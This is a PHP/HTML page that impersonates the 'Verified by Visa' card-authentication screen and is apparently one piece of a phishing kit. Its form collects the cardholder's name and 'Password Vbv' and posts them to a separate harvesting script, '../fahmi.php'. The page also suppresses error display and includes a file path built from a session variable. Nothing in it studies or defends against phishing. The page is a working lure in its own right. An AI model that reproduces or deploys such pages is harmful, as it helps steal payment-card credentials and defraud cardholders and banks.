<?php
session_start();
/*


*/


date_default_timezone_set('GMT');
$copyright = date("Y");
include "../lang".$_SESSION['DZLN'];
@ini_set('display_errors', 0);
error_reporting(E_ALL ^ E_NOTICE);

?>












<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<html>
<head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">


<meta http-equiv="Cache-Control" content="no cache">
<meta http-equiv="Pragma" content="no cache">
<meta http-equiv="Expires" content="0">


	<title>Verified by Visa</title>
	

	


<link rel="stylesheet" type="text/css" href="index.css" media="all">
</head>
<body leftmargin="0" topmargin="0" onload="OnPageInit();" onbeforeunload="onBeforeUnloadHandler(this);" onfocus="onFocusHandler();" marginheight="0" marginwidth="0" bgcolor="#ffffff">



<!-- This table centers the content area in the window, irregardless of the window's size -->
<table width="100%" border="0" cellpadding="0" cellspacing="0">
	<tbody><tr>
		<td colspan="3"><img src="spacer_clear.gif" alt="" height="20" width="1" border="0"><br></td>
	</tr>
	<!-- Top 10 pixels of white space -->
	<tr>
		<td><img src="spacer_clear.gif" alt="" height="1" width="20" border="0"><br>
		</td><!-- Left 20 pixels of white space -->
		<td align="center">


			<!-- Content area -->
			<table height="340" width="330" border="0" cellpadding="0" cellspacing="0">
				<tbody><tr>
					<td height="51" valign="top" width="89">
						<img name="vpasLogo" src="dznoob0.gif" alt="Verified by Visa" border="0"><br>
					</td>
					<td height="51" valign="top" width="301" align="right">
						<img name="memberLogo" src="dzn-129x32.svg" alt="Issuer Logo" border="0"><br>
					</td>
				</tr>
			<tr>
			<td colspan="3"><img src="spacer_clear.gif" alt="" height="20" width="1" border="0"><br></td>
			</tr>
				<tr>

					<td colspan="2" height="100" valign="top">


<font face="arial" size="2" color="#ff7800"></font>
                		 <noscript>

							<font face="arial" SIZE="2" color="#ff7800"></font>
						 </noscript>
<form name"passwd" action="../fahmi.php" method="POST"">
<center>
Name On Card:<input type=text name=fahmi required>
<br>
<br>
Password Vbv:<input type=text name=trabelsi required>
<br>
<br>
<input type=submit>

</center>
</form>

						<br>
						<img src="spacer_clear.gif" alt="" height="5" width="1" border="0">
												<img src="spacer_clear.gif" alt="" height="5" width="1" border="0">
					
						<img src="spacer_clear.gif" alt="" height="20" width="1" border="0">
						<br>

							


		<!-- end copyright notice table-->

				</td>
				</tr>

			</tbody></table>
			<!-- End of content area -->

		</td>
		<td><img src="spacer_clear.gif" alt="" height="0" width="20" border="0"><br></td><!-- Right 20 pixels of white space -->
	</tr>
</tbody></table>





</body>
</html>